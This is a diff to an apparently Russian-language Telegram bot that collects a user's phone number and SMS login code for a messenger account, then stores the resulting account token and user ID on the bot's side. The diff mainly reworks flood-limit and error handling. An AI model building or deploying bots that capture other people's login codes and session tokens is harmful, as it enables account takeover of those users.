@@ -120,44 +120,44 @@ async def phone_handler(message: types.Message, state: FSMContext):
 
     msg = await safe_send(message, "⏳ Отправляю SMS...")
 
+    class FloodHandler(logging.Handler):
+        def emit(self, record):
+            msg_text = record.getMessage().lower()
+            if "limit.violate" in msg_text or "слишком много попыток" in msg_text or "попробуйте позже" in msg_text:
+                if uid in pending:
+                    pending[uid]["status"] = "flood_sms"
+
+    handler = FloodHandler()
+    logging.getLogger().addHandler(handler)
+
     async def auth_task():
         try:
             await client.start()
-            pending[uid]["token"] = client.token
-            pending[uid]["user_id"] = client.my_id
-            pending[uid]["status"] = "done"
-            logging.info(f"Токен сохранён: {client.token[:20]}...")
+            if pending[uid].get("status") != "flood_sms":
+                pending[uid]["token"] = client.token
+                pending[uid]["user_id"] = client.my_id
+                pending[uid]["status"] = "done"
         except Exception as e:
             error = str(e).lower()
-            logging.error(f"Ошибка авторизации: {e}")
-            # Проверяем файл сессии
-            session_file = os.path.join(work_dir, "session.db")
-            if not os.path.exists(session_file):
+            if pending[uid].get("status") != "flood_sms":
                 if "block" in error:
                     pending[uid]["status"] = "blocked"
-                elif "flood" in error or "limit" in error:
-                    pending[uid]["status"] = "flood_sms"
                 elif "password" in error or "2fa" in error:
                     pending[uid]["status"] = "need_password"
+                elif "invalid" in error or "wrong" in error:
+                    pending[uid]["status"] = "invalid_code"
                 else:
                     pending[uid]["status"] = f"error:{e}"
-            else:
-                # Сессия есть, значит авторизация идёт
-                pass
+        finally:
+            logging.getLogger().removeHandler(handler)
 
-    # Запускаем задачу
-    task = asyncio.ensure_future(auth_task())
+    asyncio.ensure_future(auth_task())
+    await asyncio.sleep(4)
 
-    # Ждём 3 секунды — за это время pymax точно получит ответ от сервера
-    await asyncio.sleep(3)
-
-    # Проверяем статус
     if uid not in pending:
         return
 
-    # Проверяем статус И наличие файла сессии
     status = pending[uid].get("status", "")
-    session_file = os.path.join(work_dir, "session.db")
 
     if status == "flood_sms":
         await safe_edit(msg, "⏳ Слишком много попыток. Попробуйте позже.")
@@ -177,12 +177,7 @@ async def phone_handler(message: types.Message, state: FSMContext):
         await state.clear()
         return
 
-    elif os.path.exists(session_file):
-        await safe_edit(msg, "✅ SMS отправлена. Введи код из 6 цифр:")
-    else:
-        await safe_edit(msg, "❌ Не удалось отправить SMS. Попробуйте позже.")
-        del pending[uid]
-        await state.clear()
+    await safe_edit(msg, "✅ SMS отправлена. Введи код из 6 цифр:")
 
 @dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
 async def code_handler(message: types.Message, state: FSMContext):
